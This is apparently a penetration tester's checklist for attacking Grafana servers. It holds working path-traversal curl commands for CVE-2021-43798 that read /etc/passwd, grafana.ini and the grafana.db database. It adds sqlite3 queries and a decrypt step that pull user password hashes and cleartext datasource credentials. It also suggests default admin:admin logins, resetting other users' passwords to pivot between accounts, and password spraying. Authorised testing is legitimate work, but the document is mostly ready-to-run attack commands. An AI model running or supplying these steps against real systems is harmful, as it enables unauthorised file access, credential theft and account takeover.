# Grafana

## Before I start
- [ ] Port 3000; version: curl -s http://target:3000/api/health + login page assets
- [ ] Try admin:admin first — costs one second

## CVE-2021-43798 (8.0.0–8.3.0, unauth file read)
curl --path-as-is http://target:3000/public/plugins/alertlist/../../../../../../etc/passwd
curl --path-as-is http://target:3000/public/plugins/grafana/../../../../../../etc/grafana/grafana.ini
curl --path-as-is http://target:3000/public/plugins/grafana/../../../../../../var/lib/grafana/grafana.db --output grafana.db
- [ ] Any plugin ID works as the path prefix: alertlist, grafana, piechart, table, prometheus
- [ ] --path-as-is is mandatory or curl normalizes the ../

## Decrypt the loot
sqlite3 grafana.db 'select email,login,password from user;'
sqlite3 grafana.db 'select name,url,user,password,secure_json_data from data_source;'
python3 grafana_decrypt.py grafana.db <secret_key_from_grafana.ini>
- [ ] Datasource passwords = AES keyed by secret_key → cleartext DB creds
- [ ] User passwords = PBKDF2 → :Pb hash-cracking

## Admin console plays
- [ ] Server Admin → Users → reset any password (pivot accounts)
- [ ] Dashboards/explore → internal topology, hostnames, IPs for the report

## If it fails
- [ ] Traversal 404s on every plugin → patched; searchsploit grafana for the build (CVE-2024-9264 DuckDB etc.): :Pb web-cves

## Next
- [ ] Datasource creds → hit the DBs directly: :Pb mysql / :Pb postgresql
- [ ] Password reuse sweep: :Pb spraying
